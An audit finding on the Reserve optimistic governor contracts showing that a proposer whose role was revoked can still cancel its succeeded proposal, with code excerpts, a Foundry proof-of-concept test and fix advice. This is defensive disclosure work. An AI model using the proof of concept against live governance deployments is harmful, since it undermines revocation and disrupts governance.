# A Revoked Optimistic Proposer Can Still Cancel a Succeeded Optimistic Proposal

## Metadata

- **Number:** #784
- **Severity:** Low
- **Status:** Duplicate
- **Likelihood:** High
- **Impact:** High
- **Created by:** Foundoneblock
- **Created at:** May 8, 2026 at 11:20 PM
- **Last updated:** June 2, 2026 at 5:44 AM

## Description

# Audited by [Fajar Arrizki]

Independent audit notes by Fajar Arrizki. Findings, proof-of-concept references, and impact assessments are documented for manual review.

_Note: Not all issues are guaranteed to be correct._

# A Revoked Optimistic Proposer Can Still Cancel a Succeeded Optimistic Proposal
---
**#M-31**
- Severity: Medium
- Validity: Tested
- Likelihood: Medium
- Impact: Governance can revoke an optimistic proposer’s future creation rights, but that same address can still come back in a later phase and cancel its already-succeeded optimistic proposal because cancellation reuses the stored proposer identity instead of re-checking current proposer authorization

## Description

The system already checks `OPTIMISTIC_PROPOSER_ROLE` when an optimistic proposal is first created.

However, the proposal’s proposer address is then stored in proposal state and later reused by `_validateCancel()` as an authorized canceller for optimistic proposals in every state except `Defeated`.

That creates a distinct stale-authority path:

1. an address is authorized as an optimistic proposer,
2. it creates an optimistic proposal,
3. governance later revokes its `OPTIMISTIC_PROPOSER_ROLE`,
4. the proposal survives through its lifecycle and reaches `Succeeded`,
5. and the now-revoked original proposer can still cancel it.

This is not the same issue as:

- **M-10**, which was about a revoked proposer’s old proposal remaining executable,
- or **M-17**, which was about an optimistic guardian canceling after success.

Here, the distinct failure is that the original proposer’s **creation-time authority** persists into a later-phase **cancellation** capability even after proposer authority has supposedly been removed.

### Optimistic proposer authority is checked only at creation time

```solidity
function proposeOptimistic(
    ProposalData calldata proposal,
    GovernorUpgradeable.ProposalCore storage proposalCore,
    IReserveOptimisticGovernor.OptimisticGovernanceParams calldata optimisticParams
) external {
    _validateProposal(proposal, proposalCore);

    ReserveOptimisticGovernor governor = _governor();

    require(
        AccessControl(governor.timelock()).hasRole(OPTIMISTIC_PROPOSER_ROLE, proposal.proposer),
        IReserveOptimisticGovernor.OptimisticGovernor__NotOptimisticProposer(proposal.proposer)
    );
    ...
}
```

Source:
- `contracts/governance/lib/ProposalLib.sol:33-47`

GitHub permalink:
- `https://github.com/reserve-protocol/reserve-governor/blob/dc27a68463cec356ff18bbdd3d8edfe9b2534372/contracts/governance/lib/ProposalLib.sol#L33-L47`

This only validates proposer authority once, at proposal admission.

### Revocation removes future proposer role membership only

```solidity
/// @dev Guardian can revoke OPTIMISTIC_PROPOSER_ROLE
///      Any malicious proposals should be cancelled if their execution needs to also be prevented
function revokeOptimisticProposer(address account) external onlyRole(CANCELLER_ROLE) {
    _revokeRole(OPTIMISTIC_PROPOSER_ROLE, account);
}
```

Source:
- `contracts/governance/TimelockControllerOptimistic.sol:67-70`

GitHub permalink:
- `https://github.com/reserve-protocol/reserve-governor/blob/dc27a68463cec356ff18bbdd3d8edfe9b2534372/contracts/governance/TimelockControllerOptimistic.sol#L67-L70`

The role is revoked, but there is no coupling here to later cancellation rights on already-created proposals.

### Cancellation later reuses the stored proposer identity instead of current proposer authority

```solidity
function _validateCancel(uint256 proposalId, address caller) internal view override returns (bool) {
    TimelockControllerOptimistic t = _timelock();

    if (t.hasRole(CANCELLER_ROLE, caller)) {
        return true;
    }

    if (caller != proposalProposer(proposalId)) {
        return false;
    }

    ProposalState s = state(proposalId);

    return _isOptimistic(proposalId) ? s != ProposalState.Defeated : s == ProposalState.Pending;
}
```

Source:
- `contracts/governance/ReserveOptimisticGovernor.sol:374-388`

GitHub permalink:
- `https://github.com/reserve-protocol/reserve-governor/blob/dc27a68463cec356ff18bbdd3d8edfe9b2534372/contracts/governance/ReserveOptimisticGovernor.sol#L374-L388`

So for optimistic proposals, any stored proposer remains a valid canceller in all states except `Defeated`, including `Succeeded`, even if they no longer hold `OPTIMISTIC_PROPOSER_ROLE`.

## Root Cause

The root cause is that optimistic proposer authorization is snapshotted at proposal creation, but later cancellation authority is derived from the stored proposer identity rather than the proposer’s current role status.

```text
root cause:
- proposeOptimistic() checks OPTIMISTIC_PROPOSER_ROLE only at creation time
- the proposer address is then stored in proposal state
- revokeOptimisticProposer() removes future role membership only
- _validateCancel() later authorizes cancellation based on caller == proposalProposer(proposalId)
- optimistic proposals remain cancelable by the original proposer in every non-Defeated state even after revocation
```

## Impact

This issue can cause:

- a revoked optimistic proposer to keep meaningful control over an already-succeeded optimistic proposal,
- incident response or key revocation to provide less containment than operators expect,
- and governance to remove future proposal-creation rights while accidentally preserving late-phase destructive cancellation power.

This is a governance-integrity and stale-authority problem rather than a direct asset-seizure primitive, so Medium severity is the right fit.

## Likelihood

Likelihood is **medium**.

The issue requires:

- an optimistic proposer to create a proposal while authorized,
- later revocation of that proposer,
- the proposal to remain alive through to a later phase such as `Succeeded`,
- and the revoked proposer to act before execution.

Those conditions are realistic during operator rotation, compromise response, or governance disputes.

## Severity Rationale

### Why Impact is Medium

The impact is **medium** because a revoked proposer can still destroy the lifecycle of an already-succeeded optimistic proposal, undermining the intended meaning of proposer revocation.

### Why it is not High

It is **not high** because the stale authority is limited to proposals already created by that proposer and still subject to normal lifecycle timing. This is not a new arbitrary execution or custody takeover path.

## Proof of Concept

### What the test proves

The standalone PoC demonstrates:

1. an authorized optimistic proposer creates an optimistic proposal,
2. governance revokes that proposer’s `OPTIMISTIC_PROPOSER_ROLE`,
3. the role is indeed gone for future proposal creation,
4. the already-created proposal still reaches `Succeeded`,
5. and the revoked original proposer can still call `governor.cancel(...)` successfully,
6. transitioning the proposal from `Succeeded` to `Canceled`.

### Test code

### PocNewBase.t.sol
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import { Test } from "forge-std/Test.sol";

import { IGovernor } from "@openzeppelin/contracts/governance/IGovernor.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { IERC20Metadata } from "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";

import { OptimisticSelectorRegistry } from "@governance/OptimisticSelectorRegistry.sol";
import { ReserveOptimisticGovernor } from "@governance/ReserveOptimisticGovernor.sol";
import { TimelockControllerOptimistic } from "@governance/TimelockControllerOptimistic.sol";
import { IReserveOptimisticGovernorDeployer } from "@interfaces/IDeployer.sol";
import { IOptimisticSelectorRegistry } from "@interfaces/IOptimisticSelectorRegistry.sol";
import { IReserveOptimisticGovernor } from "@interfaces/IReserveOptimisticGovernor.sol";
import { ReserveOptimisticGovernorDeployer } from "@src/Deployer.sol";
import { Guardian } from "@src/Guardian.sol";
import { ReserveOptimisticGovernanceVersionRegistry } from "@src/VersionRegistry.sol";
import { RewardTokenRegistry } from "@staking/RewardTokenRegistry.sol";
import { StakingVault } from "@staking/StakingVault.sol";
import { CANCELLER_ROLE, EXECUTOR_ROLE, OPTIMISTIC_PROPOSER_ROLE, PROPOSER_ROLE } from "@utils/Constants.sol";

import { MockERC20 } from "@mocks/MockERC20.sol";
import { MockRoleRegistry } from "@mocks/MockRoleRegistry.sol";

abstract contract PocNewBase is Test {
    MockERC20 internal underlying;
    StakingVault internal stakingVault;
    OptimisticSelectorRegistry internal registry;
    Guardian internal guardianContract;
    ReserveOptimisticGovernorDeployer internal deployer;
    ReserveOptimisticGovernor internal governor;
    TimelockControllerOptimistic internal timelock;

    address internal alice = makeAddr("alice");
    address internal bob = makeAddr("bob");
    address internal carol = makeAddr("carol");
    address internal guardian = makeAddr("guardian");
    address internal additionalGuardian = makeAddr("additionalGuardian");
    address internal optimisticGuardianManager = makeAddr("optimisticGuardianManager");
    address internal optimisticGuardian = makeAddr("optimisticGuardian");
    address internal optimisticProposer = makeAddr("optimisticProposer");
    address internal optimisticProposer2 = makeAddr("optimisticProposer2");

    uint48 internal constant VETO_DELAY = 1 hours;
    uint32 internal constant VETO_PERIOD = 2 hours;
    uint256 internal constant VETO_THRESHOLD = 0.2e18;
    uint48 internal constant VOTING_DELAY = 1 days;
    uint32 internal constant VOTING_PERIOD = 1 weeks;
    uint48 internal constant VOTE_EXTENSION = 1 days;
    uint256 internal constant PROPOSAL_THRESHOLD = 0.01e18;
    uint256 internal constant QUORUM_NUMERATOR = 0.1e18;
    uint256 internal constant PROPOSAL_THROTTLE_CAPACITY = 2;
    uint256 internal constant TIMELOCK_DELAY = 2 days;
    uint256 internal constant REWARD_HALF_LIFE = 1 days;
    uint256 internal constant UNSTAKING_DELAY = 0;
    uint256 internal constant ALICE_STAKE = 400_000e18;
    uint256 internal constant BOB_STAKE = 400_000e18;
    uint256 internal constant CAROL_STAKE = 200_000e18;

    function _useExistingStakingVaultDeployment() internal pure virtual returns (bool);

    function setUp() public virtual {
        underlying = new MockERC20("Underlying Token", "UNDL");

        MockRoleRegistry roleRegistry = new MockRoleRegistry(address(this));
        ReserveOptimisticGovernanceVersionRegistry versionRegistry =
            new ReserveOptimisticGovernanceVersionRegistry(roleRegistry);
        RewardTokenRegistry rewardTokenRegistry = new RewardTokenRegistry(roleRegistry);

        StakingVault stakingVaultImpl = new StakingVault();
        ReserveOptimisticGovernor governorImpl = new ReserveOptimisticGovernor();
        TimelockControllerOptimistic timelockImpl = new TimelockControllerOptimistic();
        OptimisticSelectorRegistry registryImpl = new OptimisticSelectorRegistry();
        address[] memory optimisticGuardians = new address[](1);
        optimisticGuardians[0] = optimisticGuardian;

        guardianContract = new Guardian(guardian, optimisticGuardianManager, optimisticGuardians);

        deployer = new ReserveOptimisticGovernorDeployer(
            address(versionRegistry),
            address(rewardTokenRegistry),
            address(guardianContract),
            address(stakingVaultImpl),
            address(governorImpl),
            address(timelockImpl),
            address(registryImpl)
        );
        versionRegistry.registerVersion(deployer);

        address[] memory optimisticProposers = new address[](2);
        optimisticProposers[0] = optimisticProposer;
        optimisticProposers[1] = optimisticProposer2;

        bytes4[] memory transferSelectors = new bytes4[](1);
        transferSelectors[0] = IERC20.transfer.selector;

        IOptimisticSelectorRegistry.SelectorData[] memory selectorData =
            new IOptimisticSelectorRegistry.SelectorData[](1);
        selectorData[0] = IOptimisticSelectorRegistry.SelectorData(address(underlying), transferSelectors);

        IReserveOptimisticGovernorDeployer.BaseDeploymentParams memory baseParams =
            IReserveOptimisticGovernorDeployer.BaseDeploymentParams({
                optimisticParams: IReserveOptimisticGovernor.OptimisticGovernanceParams({
                    vetoDelay: VETO_DELAY, vetoPeriod: VETO_PERIOD, vetoThreshold: VETO_THRESHOLD
                }),
                standardParams: IReserveOptimisticGovernor.StandardGovernanceParams({
                    votingDelay: VOTING_DELAY,
                    votingPeriod: VOTING_PERIOD,
                    voteExtension: VOTE_EXTENSION,
                    proposalThreshold: PROPOSAL_THRESHOLD,
                    quorumNumerator: QUORUM_NUMERATOR
                }),
                selectorData: selectorData,
                optimisticProposers: optimisticProposers,
                additionalGuardians: _additionalGuardians(),
                timelockDelay: TIMELOCK_DELAY,
                proposalThrottleCapacity: PROPOSAL_THROTTLE_CAPACITY
            });

        IReserveOptimisticGovernorDeployer.NewStakingVaultParams memory newStakingVaultParams =
            IReserveOptimisticGovernorDeployer.NewStakingVaultParams({
                underlying: IERC20Metadata(address(underlying)),
                rewardTokens: new address[](0),
                rewardHalfLife: REWARD_HALF_LIFE,
                unstakingDelay: UNSTAKING_DELAY
            });

        (address stakingVaultAddr, address governorAddr, address timelockAddr, address selectorRegistryAddr) =
            deployer.deployWithNewStakingVault(baseParams, newStakingVaultParams, bytes32(0));

        if (_useExistingStakingVaultDeployment()) {
            (address existingGovernorAddr, address existingTimelockAddr, address existingSelectorRegistryAddr) =
                deployer.deployWithExistingStakingVault(baseParams, stakingVaultAddr, bytes32(uint256(1)));

            governor = ReserveOptimisticGovernor(payable(existingGovernorAddr));
            timelock = TimelockControllerOptimistic(payable(existingTimelockAddr));
            registry = OptimisticSelectorRegistry(existingSelectorRegistryAddr);
            stakingVault = StakingVault(address(governor.token()));
        } else {
            governor = ReserveOptimisticGovernor(payable(governorAddr));
            timelock = TimelockControllerOptimistic(payable(timelockAddr));
            registry = OptimisticSelectorRegistry(selectorRegistryAddr);
            stakingVault = StakingVault(stakingVaultAddr);
        }

        _setupVoter(alice, ALICE_STAKE);
        _setupVoter(bob, BOB_STAKE);
        _setupVoter(carol, CAROL_STAKE);

        vm.warp(block.timestamp + 12 hours);
    }

    function _additionalGuardians() internal view returns (address[] memory guardians) {
        guardians = new address[](1);
        guardians[0] = additionalGuardian;
    }

    function _setupVoter(address voter, uint256 amount) internal {
        underlying.mint(voter, amount);

        vm.startPrank(voter);
        underlying.approve(address(stakingVault), amount);
        stakingVault.depositAndDelegate(amount);
        vm.stopPrank();
    }

    function _singleCall(address target, uint256 value, bytes memory callData)
        internal
        pure
        returns (address[] memory targets, uint256[] memory values, bytes[] memory calldatas)
    {
        targets = new address[](1);
        values = new uint256[](1);
        calldatas = new bytes[](1);

        targets[0] = target;
        values[0] = value;
        calldatas[0] = callData;
    }

    function _warpToActive(uint256 proposalId) internal {
        vm.warp(governor.proposalSnapshot(proposalId) + 1);
    }

    function _warpPastDeadline(uint256 proposalId) internal {
        vm.warp(governor.proposalDeadline(proposalId) + 1);
    }

    function _proposePassAndQueueStandard(
        address[] memory targets,
        uint256[] memory values,
        bytes[] memory calldatas,
        string memory description
    ) internal returns (uint256 proposalId, bytes32 descriptionHash) {
        vm.prank(alice);
        proposalId = governor.propose(targets, values, calldatas, description);

        _warpToActive(proposalId);

        vm.prank(alice);
        governor.castVote(proposalId, 1);
        vm.prank(bob);
        governor.castVote(proposalId, 1);
        vm.prank(carol);
        governor.castVote(proposalId, 1);

        _warpPastDeadline(proposalId);
        descriptionHash = keccak256(bytes(description));
        governor.queue(targets, values, calldatas, descriptionHash);
    }
}

abstract contract PocNewBaseNewVault is PocNewBase {
    function _useExistingStakingVaultDeployment() internal pure virtual override returns (bool) {
        return false;
    }
}

abstract contract PocNewBaseExistingVault is PocNewBase {
    function _useExistingStakingVaultDeployment() internal pure virtual override returns (bool) {
        return true;
    }
}
```

### A Revoked Optimistic Proposer Can Still Cancel a Succeeded Optimistic Proposal

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import { IGovernor } from "@openzeppelin/contracts/governance/IGovernor.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import { OPTIMISTIC_PROPOSER_ROLE } from "@utils/Constants.sol";

import { PocNewBaseNewVault } from "./PocNewBase.t.sol";

contract PocRevokedProposerCanStillCancelSucceededOptimisticProposalTest is PocNewBaseNewVault {
    function test_poc_revokedOptimisticProposerCanStillCancelSucceededProposal() public {
        uint256 transferAmount = 1_000e18;
        address[] memory targets = new address[](1);
        targets[0] = address(underlying);
        uint256[] memory values = new uint256[](1);
        bytes[] memory calldatas = new bytes[](1);
        calldatas[0] = abi.encodeCall(IERC20.transfer, (alice, transferAmount));
        string memory description = "revoked proposer can still cancel after success";

        vm.prank(optimisticProposer);
        uint256 proposalId = governor.proposeOptimistic(targets, values, calldatas, description);

        vm.prank(guardian);
        guardianContract.revokeOptimisticProposer(address(governor), optimisticProposer);

        _warpToActive(proposalId);
        _warpPastDeadline(proposalId);

        assertFalse(
            timelock.hasRole(OPTIMISTIC_PROPOSER_ROLE, optimisticProposer),
            "optimistic proposer should be revoked for future creations"
        );
        assertEq(uint256(governor.state(proposalId)), uint256(IGovernor.ProposalState.Succeeded));

        vm.prank(optimisticProposer);
        governor.cancel(targets, values, calldatas, keccak256(bytes(description)));

        assertEq(uint256(governor.state(proposalId)), uint256(IGovernor.ProposalState.Canceled));
    }
}
```

### Test output

```text
Ran 1 test for test/poc_new/PocRevokedProposerCanStillCancelSucceededOptimisticProposal.t.sol:PocRevokedProposerCanStillCancelSucceededOptimisticProposalTest
[PASS] test_poc_revokedOptimisticProposerCanStillCancelSucceededProposal() (gas: 528221)
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 32.18ms (1.43ms CPU time)

Ran 1 test suite in 59.13ms (32.18ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

## Recommendation

- When `OPTIMISTIC_PROPOSER_ROLE` is revoked, do not continue deriving later cancellation authority purely from stored proposer identity.
- For optimistic proposals, require the original proposer to still hold current proposer authority if proposer-based cancellation is intended to remain available beyond creation time.
- Alternatively, explicitly scope proposer-cancel rights to earlier optimistic phases only, rather than every non-`Defeated` state.

